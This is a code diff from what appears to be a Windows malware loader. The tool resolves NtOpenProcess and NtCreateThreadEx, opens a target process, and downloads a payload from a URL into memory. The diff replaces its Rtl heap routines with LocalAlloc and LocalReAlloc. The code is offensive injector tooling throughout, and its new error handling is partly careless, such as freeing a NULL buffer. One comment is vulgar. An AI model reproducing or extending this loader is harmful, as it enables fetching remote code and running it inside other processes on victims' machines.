@@ -56,10 +56,10 @@ int main(int argc, char* argv[]) {
 	NtOpenProcess meowOpen = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
 	NtCreateThreadEx meowThreadOpen = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
 	NtClose meowClose = (NtClose)GetProcAddress(hNTDLL, "NtClose");
-	RtlCreateHeap meowCreateHeap = (RtlCreateHeap)GetProcAddress(hNTDLL, "RtlCreateHeap");
-	RtlAllocateHeap meowAllocateHeap = (RtlAllocateHeap)GetProcAddress(hNTDLL, "RtlAllocateHeap");
-	RtlFreeHeap meowFreeHeap = (RtlFreeHeap)GetProcAddress(hNTDLL, "RtlFreeHeap");
-	RtlDestroyHeap meowDestroyHeap = (RtlDestroyHeap)GetProcAddress(hNTDLL, "RtlDestroyHeap");
+	// RtlCreateHeap meowCreateHeap = (RtlCreateHeap)GetProcAddress(hNTDLL, "RtlCreateHeap");
+	// RtlAllocateHeap meowAllocateHeap = (RtlAllocateHeap)GetProcAddress(hNTDLL, "RtlAllocateHeap");
+	// RtlFreeHeap meowFreeHeap = (RtlFreeHeap)GetProcAddress(hNTDLL, "RtlFreeHeap");
+	// RtlDestroyHeap meowDestroyHeap = (RtlDestroyHeap)GetProcAddress(hNTDLL, "RtlDestroyHeap");
 	LOG_SUCCESS("finished populating function prototypes");
 
 	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
@@ -91,35 +91,16 @@ int main(int argc, char* argv[]) {
 
 	if (hURL == NULL) {
 		LOG_ERROR("could not open a handle to URL... Error: %ld", GetLastError());
-		meowClose(hProcess);
 		CloseHandle(hInet);
+		meowClose(hProcess);
 		return 1;
 	}
 
 	LOG_SUCCESS("successfully opened a handle to the provided URL!");
 
-	/*
-	create heap and commit it immediately
-	hTmpHeap = (PBYTE)meowCreateHeap(HEAP_GROWABLE, NULL, 1024, 2048, NULL, NULL);
-
-	if (hTmpHeap == NULL) {
-		meowClose(hProcess);
-		CloseHandle(hInet);
-		LOG_ERROR("failed to create temporary heap, Error: %ld", GetLastError());
-		return 1;
-	}
-
-	LOG_SUCCESS("successfully created temporary heap");
-	*/
-
-	hTmpHeap = NtCurrentHeap();
-
-	// allocate memory in the heap
-	pTmpBytes = (PBYTE)meowAllocateHeap(hTmpHeap, HEAP_ZERO_MEMORY, 1024);
-
+	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
 	if (pTmpBytes == NULL) {
 		LOG_ERROR("failed to allocate memory in temporary heap, Error: %ld", GetLastError());
-		meowDestroyHeap(hTmpHeap);
 		InternetCloseHandle(hURL);
 		CloseHandle(hInet);
 		meowClose(hProcess);
@@ -133,8 +114,7 @@ int main(int argc, char* argv[]) {
 		// read 1024 bytes to temp buffer
 		if (!InternetReadFile(hURL, pTmpBytes, 1024, &dwBytesRead)) {
 			LOG_ERROR("could not read contents of specified file... Error: %ld", GetLastError());
-			meowFreeHeap(hTmpHeap, NULL, pTmpBytes);
-			meowDestroyHeap(hTmpHeap);
+			LocalFree(pTmpBytes);
 			InternetCloseHandle(hURL);
 			CloseHandle(hInet);
 			meowClose(hProcess);
@@ -146,37 +126,19 @@ int main(int argc, char* argv[]) {
 
 		// allocate final buffer
 		if (pBytes == NULL) {
-			hHeap = (PBYTE)meowCreateHeap(HEAP_GROWABLE, NULL, dwBytesRead, dwBytesRead, NULL, NULL);
-			pBytes = (PBYTE)meowAllocateHeap(hHeap, HEAP_ZERO_MEMORY, dwBytesRead);
+			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
 		}
 		else {
 			// if it wasn't NULL, reallocate it to == sSize
-			// pBytes = (PBYTE)meowAllocateHeap(hHeap, HEAP_REALLOC, sSize);
-			LOG_ERROR("pBytes is not null, what's up with that?");
-			return 1;
-		}
-
-		if (hHeap == NULL) {
-			meowFreeHeap(hHeap, NULL, pBytes);
-			meowFreeHeap(hTmpHeap, NULL, pTmpBytes);
-			meowDestroyHeap(hHeap);
-			meowDestroyHeap(hTmpHeap);
-			InternetCloseHandle(hURL);
-			CloseHandle(hInet);
-			meowClose(hProcess);
-			LOG_ERROR("failed to create final heap, Error: %ld", GetLastError());
-			return 1;
+			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
 		}
 
 		if (pBytes == NULL) {
-			meowFreeHeap(hHeap, NULL, pBytes);
-			meowFreeHeap(hTmpHeap, NULL, pTmpBytes);
-			meowDestroyHeap(hHeap);
-			meowDestroyHeap(hTmpHeap);
+			LocalFree(pBytes);
+			LocalFree(pTmpBytes);
 			InternetCloseHandle(hURL);
 			CloseHandle(hInet);
-			meowClose(hProcess);
-			LOG_ERROR("failed to create final buffer, Error: %ld", GetLastError());
+			CloseHandle(hProcess);
 			return 1; // as i said, i am sick and tired of error handling, get off my dick
 		}
 
